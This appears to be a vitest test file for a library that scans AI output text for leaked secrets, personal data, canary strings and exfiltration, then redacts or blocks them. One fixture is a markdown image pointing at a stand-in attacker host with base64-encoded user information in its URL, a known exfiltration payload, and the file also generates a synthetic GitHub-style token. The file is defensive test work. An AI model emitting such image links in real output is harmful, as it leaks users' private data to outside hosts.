import { describe, expect, it } from "vitest";
import {
  createCanary,
  DEFAULT_REDACTION_TEXT,
  mergeRanges,
  redactFindings,
  redactionLabel,
  scanOutputText,
} from "../output/index";

describe("mergeRanges", () => {
  it("sorts and merges overlapping and adjacent ranges", () => {
    const merged = mergeRanges([
      { start: 10, end: 15, kind: "b" },
      { start: 0, end: 5, kind: "a" },
      { start: 5, end: 8, kind: "c" },
      { start: 12, end: 20, kind: "d" },
      { start: 30, end: 31, kind: "e" },
    ]);
    expect(merged.map((m) => [m.start, m.end])).toEqual([
      [0, 8],
      [10, 20],
      [30, 31],
    ]);
    expect(merged[0].findings.map((f) => f.kind)).toEqual(["a", "c"]);
    expect(merged[1].findings.map((f) => f.kind)).toEqual(["b", "d"]);
  });

  it("clamps to the text and drops empty or invalid ranges", () => {
    const merged = mergeRanges(
      [
        { start: -5, end: 3 },
        { start: 4, end: 4 },
        { start: 9, end: 7 },
        { start: 8, end: 50 },
        { start: Number.NaN, end: 2 },
      ],
      10
    );
    expect(merged.map((m) => [m.start, m.end])).toEqual([
      [0, 3],
      [8, 10],
    ]);
  });

  it("returns [] for no ranges", () => {
    expect(mergeRanges([])).toEqual([]);
  });
});

describe("redactFindings", () => {
  const text = "email jane@acme.io and key sk-abc now";

  it("replaces each merged range with [REDACTED] by default", () => {
    const out = redactFindings(text, [
      { start: 6, end: 18, kind: "email" },
      { start: 27, end: 33, kind: "openai_api_key" },
    ]);
    expect(out).toBe(
      `email ${DEFAULT_REDACTION_TEXT} and key ${DEFAULT_REDACTION_TEXT} now`
    );
  });

  it("supports a custom string and type-aware labels", () => {
    const findings = [
      { start: 6, end: 18, kind: "email", type: "pii" },
      { start: 27, end: 33, type: "secret" },
    ];
    expect(redactFindings(text, findings, { redactionText: "***" })).toBe(
      "email *** and key *** now"
    );
    expect(
      redactFindings(text, findings, { redactionText: redactionLabel })
    ).toBe("email [REDACTED:email] and key [REDACTED:secret] now");
  });

  it("redacts overlapping findings once and passes every merged finding to the function", () => {
    let seen: string[] = [];
    const out = redactFindings(
      "0123456789",
      [
        { start: 2, end: 6, kind: "outer" },
        { start: 3, end: 5, kind: "inner" },
        { start: 6, end: 8, kind: "adjacent" },
      ],
      {
        redactionText: (first, merged) => {
          seen = merged.map((f) => f.kind ?? "");
          return `<${first.kind}>`;
        },
      }
    );
    expect(out).toBe("01<outer>89");
    expect(seen).toEqual(["outer", "inner", "adjacent"]);
  });

  it("returns the text unchanged when there is nothing to redact", () => {
    expect(redactFindings(text, [])).toBe(text);
  });
});

describe("redactionLabel", () => {
  it("prefers kind, then type", () => {
    expect(
      redactionLabel({ start: 0, end: 1, kind: "email", type: "pii" })
    ).toBe("[REDACTED:email]");
    expect(redactionLabel({ start: 0, end: 1, type: "canary" })).toBe(
      "[REDACTED:canary]"
    );
    expect(redactionLabel({ start: 0, end: 1 })).toBe("[REDACTED:value]");
  });
});

const A62 = "ABCDEFGHJKMNPQRSTVWXYZabcdefhjkmnpqrtvwxyz2346789";
let seed = 424_242;
function token(length: number): string {
  let out = "";
  let previous = "";
  while (out.length < length) {
    seed = (seed * 48_271) % 2_147_483_647;
    const next = A62[seed % A62.length];
    if (next !== previous) {
      out += next;
      previous = next;
    }
  }
  return out;
}

describe("scanOutputText", () => {
  const githubToken = `ghp_${token(36)}`;
  const image =
    "![x](https://evil.example/c.png?d=VGhlIHVzZXIgaXMgcGxhbm5pbmcgbGF5b2Zmcw==)";

  it("runs secrets and exfiltration by default and blocks on high/critical", () => {
    const text = `Token: ${githubToken}\n${image}\nReach me at jane.smith@acme-corp.io`;
    const result = scanOutputText(text);
    expect(result.findings.map((f) => f.type)).toEqual([
      "secret",
      "exfiltration",
    ]);
    expect(result.blocked).toBe(true);
    expect(result.redacted).toBe(
      "Token: [REDACTED]\n[REDACTED]\nReach me at jane.smith@acme-corp.io"
    );
  });

  it("opts into PII and canaries, and accepts detector options", () => {
    const canary = createCanary();
    const text = `Mail jane.smith@acme-corp.io. Ref ${canary}. ![logo](https://cdn.acme.dev/l.png)`;
    const result = scanOutputText(text, {
      pii: true,
      canary: [canary],
      exfiltration: { allowedDomains: [".acme.dev"] },
      redactionText: redactionLabel,
    });
    expect(result.findings.map((f) => f.kind)).toEqual(["email", "verbatim"]);
    expect(result.redacted).toBe(
      "Mail [REDACTED:email]. Ref [REDACTED:verbatim]. ![logo](https://cdn.acme.dev/l.png)"
    );
    expect(result.blocked).toBe(true);
  });

  it("can turn detectors off", () => {
    const text = `Token: ${githubToken}\n${image}`;
    const result = scanOutputText(text, {
      secrets: false,
      exfiltration: false,
    });
    expect(result).toEqual({ findings: [], redacted: text, blocked: false });
  });

  it("does not block on low and medium findings, and can leave them unredacted", () => {
    const text = "Test key: 4242 4242 4242 4242, docs at user@example.com";
    const result = scanOutputText(text, {
      pii: true,
      redactMinSeverity: "medium",
    });
    expect(result.findings.every((f) => f.severity === "low")).toBe(true);
    expect(result.blocked).toBe(false);
    expect(result.redacted).toBe(text);
  });

  it("returns a clean result for benign text", () => {
    const text =
      "The capital of France is Paris. See [Wikipedia](https://en.wikipedia.org/wiki/Paris).";
    expect(scanOutputText(text)).toEqual({
      findings: [],
      redacted: text,
      blocked: false,
    });
  });
});
